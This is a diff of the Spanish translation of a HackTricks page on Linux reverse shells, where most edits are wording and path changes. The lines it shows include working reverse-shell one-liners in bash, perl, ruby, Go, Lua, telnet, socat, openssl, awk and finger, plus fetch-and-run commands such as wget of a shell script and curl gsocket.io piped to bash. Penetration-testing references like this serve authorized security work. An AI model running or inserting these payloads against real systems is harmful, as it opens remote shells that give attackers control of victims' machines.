@@ -10,13 +10,13 @@ Otras formas de apoyar a HackTricks:
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-**Grupo de Seguridad Try Hard**
+**Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -24,9 +24,9 @@ Otras formas de apoyar a HackTricks:
 
 **Si tienes preguntas sobre cualquiera de estas shells puedes verificarlas con** [**https://explainshell.com/**](https://explainshell.com)
 
-## TTY Completo
+## Full TTY
 
-**Una vez que obtengas un shell inverso**[ **lee esta página para obtener un TTY completo**](full-ttys.md)**.**
+**Una vez que obtengas una shell inversa**[ **lee esta página para obtener un TTY completo**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -57,7 +57,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 1. **`bash -i`**: Esta parte del comando inicia un shell Bash interactivo (`-i`).
 2. **`>&`**: Esta parte del comando es una notación abreviada para **redirigir tanto la salida estándar** (`stdout`) como el **error estándar** (`stderr`) al **mismo destino**.
 3. **`/dev/tcp/<IP-DEL-ATAQUE>/<PUERTO>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y puerto especificados**.
-* Al **redirigir las corrientes de salida y error a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
+* Al **redirigir las salidas de error y salida a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
 4. **`0>&1`**: Esta parte del comando **redirige la entrada estándar (`stdin`) al mismo destino que la salida estándar (`stdout`)**.
 
 ### Crear en archivo y ejecutar
@@ -67,11 +67,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell Inverso
 
-Cuando se trata de una vulnerabilidad de **Ejecución de Código Remoto (RCE)** en una aplicación web basada en Linux, lograr un shell inverso puede ser obstaculizado por defensas de red como reglas iptables o mecanismos de filtrado de paquetes intrincados. En entornos tan restringidos, un enfoque alternativo implica establecer un shell PTY (Pseudo Terminal) para interactuar con el sistema comprometido de manera más efectiva.
+Cuando se trata de una vulnerabilidad de **Ejecución de Código Remoto (RCE)** en una aplicación web basada en Linux, lograr un shell inverso puede ser obstaculizado por defensas de red como reglas de iptables o mecanismos de filtrado de paquetes intrincados. En entornos tan restringidos, un enfoque alternativo implica establecer un shell PTY (Pseudo Terminal) para interactuar con el sistema comprometido de manera más efectiva.
 
 Una herramienta recomendada para este propósito es [toboggan](https://github.com/n3rada/toboggan.git), que simplifica la interacción con el entorno objetivo.
 
-Para utilizar toboggan de manera efectiva, cree un módulo de Python adaptado al contexto de RCE de su sistema objetivo. Por ejemplo, un módulo llamado `nix.py` podría estar estructurado de la siguiente manera:
+Para utilizar toboggan de manera efectiva, crea un módulo de Python adaptado al contexto de RCE de tu sistema objetivo. Por ejemplo, un módulo llamado `nix.py` podría estar estructurado de la siguiente manera:
 ```python3
 import jwt
 import httpx
@@ -127,7 +127,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet es un protocolo de red que permite la comunicación bidireccional a través de una conexión de terminal virtual. Es comúnmente utilizado para acceder y administrar dispositivos de red de forma remota.
+Telnet es un protocolo de red que permite la comunicación bidireccional a través de una terminal virtual. Es comúnmente utilizado para acceder y administrar dispositivos de red de forma remota.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -162,6 +162,8 @@ perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getpro
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
+
+Ruby es un lenguaje de programación dinámico y de código abierto conocido por su simplicidad y productividad. Es ampliamente utilizado en el desarrollo web y es compatible con varias plataformas.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -190,42 +192,12 @@ victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
-
-### Introducción
-
-Go, también conocido como Golang, es un lenguaje de programación de código abierto desarrollado por Google. Es conocido por su eficiencia y su capacidad para manejar concurrencia. En este capítulo, exploraremos cómo utilizar Go para crear shells en sistemas Linux.
-
-### Creación de una Shell en Linux con Golang
-
-Para crear una shell en Linux utilizando Golang, primero necesitamos importar el paquete `os/exec`, que nos permitirá ejecutar comandos en el sistema operativo. Luego, podemos usar la función `Command` para ejecutar comandos y capturar su salida. A continuación se muestra un ejemplo de código que muestra cómo ejecutar el comando `ls` y capturar su salida:
-
-```go
-package main
-
-import (
-	"fmt"
-	"os/exec"
-)
-
-func main() {
-	cmd := exec.Command("ls")
-	out, err := cmd.Output()
-	if err != nil {
-		fmt.Println(err)
-	}
-	fmt.Println(string(out))
-}
-```
-
-En este ejemplo, creamos un nuevo comando que ejecuta `ls` y capturamos su salida en la variable `out`. Luego, imprimimos la salida en la consola.
-
-### Conclusiones
-
-Go es un lenguaje de programación poderoso que se puede utilizar para crear shells en sistemas Linux de forma eficiente. Al aprovechar la capacidad de Go para manejar concurrencia y ejecutar comandos del sistema operativo, los hackers pueden crear herramientas personalizadas para sus necesidades de hacking.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
+
+Lua es un lenguaje de programación poderoso, eficiente y ligero. Es ampliamente utilizado en la creación de scripts y en el desarrollo de aplicaciones. Lua es conocido por su facilidad de integración con otros lenguajes y por su flexibilidad.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -283,7 +255,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-El Objetivo
+El objetivo
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -306,6 +278,8 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
+
+Awk es un lenguaje de programación versátil que se utiliza comúnmente para el procesamiento y análisis de archivos de texto en sistemas Unix y Linux. Permite a los hackers automatizar tareas, extraer y manipular datos, y generar informes personalizados. Awk es especialmente útil para trabajar con archivos de registro y realizar operaciones basadas en patrones y acciones definidas por el usuario.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -315,9 +289,9 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Para enviar el comando, escríbalo, presione enter y luego presione CTRL+D (para detener STDIN)
+Para enviar el comando escríbalo, presione enter y luego presione CTRL+D (para detener STDIN)
 
-**Victim**
+**Víctima**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -379,7 +353,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Grupo de Seguridad Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
